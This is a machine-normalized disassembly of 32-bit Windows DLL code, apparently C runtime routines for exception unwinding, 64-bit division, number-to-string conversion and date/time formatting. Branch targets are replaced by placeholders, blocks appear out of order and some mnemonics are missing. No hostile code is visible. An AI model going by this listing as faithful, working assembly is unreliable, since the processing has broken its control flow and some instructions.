jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1007c6e0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1007c700
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_1004c3b6
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_1007c745
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1007c745
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1007c700
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1007c7f5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1007c814
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1007c7ec
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1007c7f5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1007c817
push 0x14
push r--data
call sub_10078b50
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_1003938d
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1007c8e8
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_10078b95
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_10060c14
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_1007c8b9
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_100081ab
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_100081ab
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_1007c900
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1007c930
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1007ca10
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1007ca2f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
call sub_1002788e
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_10012991
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_10012991
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_1002788e
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_1007cae9
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_10012991
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] cl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_10012991
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ecx
neg ebx
adc eax ecx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push ebx
call sub_1007b3f0
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov eax edx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_1002788e
mov eax esi
jmp r-xdata
sub_1007cbd5
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_1007cc63
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_1007cd03
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100067d1
push rw-data
call sub_10066f8a
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_1002470e
leave
retn
sub_1007cd2f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_10037054
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_10044db3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_1004c3b6
leave
retn
sub_1007cd73
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_10015112
push esi
call sub_10020a90
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_1007cdca
cmp [ eax ] 0x0
push esi
mov esi edx
je r-xdata
pop esi
retn
push edi
pop edi
mov edi [ ecx ]
mov [ edi ] dl
inc [ ecx ]
inc esi
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_1007cdea
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp esi [ ecx ]
jae r-xdata
cmp [ ecx ] 0x1
mov esi [ edi ]
jbe r-xdata
mov [ ecx ] edx
dec esi
lea edx [ esi + 0x1 ]
test edx edx
je r-xdata
mov eax [ edi ]
mov [ edi ] esi
dec esi
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ esi ] dl
inc esi
dec [ ecx ]
mov edx [ ecx ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add [ edi ] eax
sub [ ecx ] eax
jmp r-xdata
push 0xa
cdq
pop ebx
idiv ebx
mov ebx [ edi ]
add dl 0x30
inc [ ebp - 0x4 ]
mov [ esi + ebx ] dl
dec esi
cmp esi 0xffffffff
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
cmp eax esi
jb r-xdata
jmp r-xdata
cmp edx 0x1
ja r-xdata
pop esi
pop ebx
leave
retn
sub_1007ce65
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
movsx eax al
push esi
mov esi [ ebp + 0xc ]
push edi
mov ebx ecx
mov edi edx
cmp eax 0x59
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xfffff894
jl r-xdata
cmp eax 0x49
jg r-xdata
mov esi [ esi + 0x8 ]
test esi esi
js r-xdata
sub eax 0x7
je r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
sub eax 0x5a
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp eax 0x1fa3
jg r-xdata
sub eax 0x4d
je r-xdata
je r-xdata
cmp esi 0x17
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
je r-xdata
cmp esi 0xb
jg r-xdata
call sub_1000f87a
call sub_1002d0ff
mov edx eax
xor eax eax
cmp [ esi + 0x20 ] eax
setne al
mov [ ebp - 0x4 ] eax
mov eax ebx
mov ebx [ ebp - 0x4 ]
mov edx [ edx + ebx * 4 ]
jmp r-xdata
sub eax 0x7
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cdq
push 0x64
pop ecx
idiv ecx
push [ ebp + 0x14 ]
mov ecx ebx
push 0x4
add eax 0x13
imul eax eax 0x64
add eax edx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
js r-xdata
push 0x6
pop ecx
sub eax ecx
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
js r-xdata
sub eax 0x4
je r-xdata
mov edx [ ebp + 0x10 ]
cmp esi 0xb
jg r-xdata
cmp eax 0x6
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
push [ ebp + 0x10 ]
push ebx
push edi
push esi
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
mov ecx edi
call sub_1007cdca
mov esi [ esi + 0x18 ]
test esi esi
js r-xdata
dec eax
je r-xdata
pop edx
cmp eax 0x3b
jmp r-xdata
mov eax [ esi ]
test eax eax
js r-xdata
dec eax
dec eax
je r-xdata
cmp esi 0x17
jg r-xdata
xor eax eax
inc eax
sub eax 0x9
je r-xdata
mov edx [ edx + 0x9c ]
mov edx [ edx + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
xor edx edx
inc edx
jmp r-xdata
push 0x0
jmp r-xdata
push 0x1
jmp r-xdata
mov eax [ esi + 0x14 ]
test eax eax
js r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
cmp esi 0x6
jle r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
dec eax
je r-xdata
jg r-xdata
cmp eax 0x3b
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
dec eax
je r-xdata
mov eax esi
cdq
push 0xc
pop ecx
idiv ecx
mov eax edx
test eax eax
jne r-xdata
sub eax 0x18
je r-xdata
mov eax ebx
call sub_1007cdea
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1007d21d
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
cdq
push 0x64
pop ecx
idiv ecx
mov ecx ebx
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
push [ ebp + 0x10 ]
push ebx
push edi
push esi
je r-xdata
dec eax
je r-xdata
jmp r-xdata
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
jne r-xdata
mov ecx ebx
jmp r-xdata
push ecx
pop eax
mov eax [ edi ]
mov [ eax ] 0x25
inc [ edi ]
dec [ ebx ]
jmp r-xdata
sub eax 0x1c
je r-xdata
jmp r-xdata
push 0x2
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x38 ]
jmp r-xdata
push 0x0
jmp r-xdata
push 0x1
mov esi [ esi + 0xc ]
cmp esi 0x1
jl r-xdata
sub eax 0x6
jne r-xdata
mov ecx eax
cmp eax ecx
jg r-xdata
jmp r-xdata
mov esi [ esi + 0x18 ]
test esi esi
js r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1007d21d
add esp 0x18
test eax eax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp esi 0x1f
jg r-xdata
mov esi [ esi + 0x1c ]
test esi esi
js r-xdata
cmp eax 0x16d
jg r-xdata
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push ebx
push edi
push esi
push 0x2
cmp esi 0x6
jg r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
sub eax 0x6
jne r-xdata
mov eax [ edi ]
mov [ eax ] 0x20
inc [ edi ]
dec [ ebx ]
mov eax esi
cmp esi 0x16d
jg r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
js r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x1c ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
mov eax [ esi + 0x8 ]
test eax eax
js r-xdata
push [ ebp + 0x14 ]
lea eax [ esi + 0x1 ]
push 0x3
jmp r-xdata
push 0x7
cdq
pop esi
idiv esi
cmp edx ecx
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x68 ]
jmp r-xdata
cmp eax 0x17
inc eax
jmp r-xdata
sub_1007d21d
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
sub ecx 0x0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
push edi
mov [ ebp - 0x24 ] eax
je r-xdata
mov edi [ eax + 0xa0 ]
dec ecx
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebp + 0xc ] 0x2
mov eax [ GetDateFormatA@IAT ]
jne r-xdata
mov edi [ eax + 0xa4 ]
jmp r-xdata
mov edi [ eax + 0xa8 ]
jmp r-xdata
xor edx edx
cmp [ ebx ] edx
je r-xdata
jmp r-xdata
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x28 ]
mov ecx 0x76c
add cx [ eax + 0x14 ]
mov [ ebp - 0x14 ] cx
mov cx [ eax + 0x10 ]
inc cx
mov [ ebp - 0x12 ] cx
mov cx [ eax + 0xc ]
mov [ ebp - 0xe ] cx
mov cx [ eax + 0x8 ]
mov [ ebp - 0xc ] cx
mov cx [ eax + 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x8 ] ax
xor eax eax
push eax
push eax
push edi
mov [ ebp - 0xa ] cx
lea ecx [ ebp - 0x14 ]
push ecx
push eax
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0x24 ]
push [ eax + 0xac ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
test eax eax
je r-xdata
mov eax [ GetTimeFormatA@IAT ]
cmp [ eax + 0xb0 ] 0x1
je r-xdata
xor eax eax
inc eax
mov [ ebp - 0x18 ] edx
mov ecx edi
add eax 0x8
cmp eax 0x400
jg r-xdata
inc ecx
inc edx
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0x1c ] ecx
movsx ecx al
cmp ecx 0x64
jg r-xdata
push eax
call sub_10056814
pop ecx
test eax eax
je r-xdata
call sub_1007c030
mov eax esp
test eax eax
je r-xdata
mov eax ecx
sub eax 0x68
je r-xdata
je r-xdata
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x5
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x27
je r-xdata
push [ ebp - 0x30 ]
mov [ ebp - 0x1c ] eax
push eax
push edi
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x24 ]
push 0x0
push [ eax + 0xac ]
call [ ebp - 0x2c ]
dec eax
test eax eax
jle r-xdata
add eax 0x8
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x6
je r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
add edi edx
test dl 0x1
je r-xdata
cmp ecx 0x41
je r-xdata
push [ ebp - 0x18 ]
call sub_10036463
pop ecx
mov edi [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
mov edi [ ebp - 0x1c ]
jmp r-xdata
mov al 0x49
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x18 ]
mov ecx ebx
push [ ebp - 0x24 ]
mov edx esi
push [ ebp - 0x28 ]
push [ ebp - 0x20 ]
call sub_1007ce65
add esp 0x10
test eax eax
je r-xdata
mov al 0x64
jmp r-xdata
dec eax
je r-xdata
mov al [ edi ]
test al al
je r-xdata
push r--data
push edi
call sub_10004dbc
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x48
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
dec eax
test eax eax
jg r-xdata
lea esp [ ebp - 0x3c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
leave
retn
push [ ebp - 0x20 ]
push ecx
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x4d
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp - 0x24 ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov al 0x61
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r--data
push edi
call sub_10004dbc
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x5
jmp r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x4d
je r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x53
jmp r-xdata
jmp r-xdata
mov edi [ eax + 0x9c ]
mov edi [ eax + 0x98 ]
jmp r-xdata
lea eax [ edx - 0x1 ]
dec eax
je r-xdata
mov al 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov al 0x70
jmp r-xdata
add edi 0x3
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x61
je r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
cmp edx 0x1
jne r-xdata
mov al 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp - 0x20 ]
movsx eax al
push eax
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x48
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x0
jbe r-xdata
jmp r-xdata
movsx eax [ edi ]
push [ ebp - 0x20 ]
push eax
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x6d
jmp r-xdata
dec eax
je r-xdata
push [ ebp - 0x20 ]
movsx eax al
push eax
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
dec [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov al 0x62
jmp r-xdata
dec eax
jne r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
mov al 0x42
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
sub_1007d680
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1007d6e8
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx ecx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
test edi edi
jle r-xdata
cmp edi 0xffffffff
jge r-xdata
mov ecx edi
mov esi [ ebp + 0x18 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
or eax 0xffffffff
sub eax ecx
add edi eax
mov [ ebp + 0x14 ] edi
inc eax
test ecx ecx
jne r-xdata
cmp esi 0xffffffff
jl r-xdata
mov ecx esi
mov eax edx
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
leave
retn
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
and [ ebp - 0x28 ] 0x0
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
or eax 0xffffffff
sub eax ecx
add esi eax
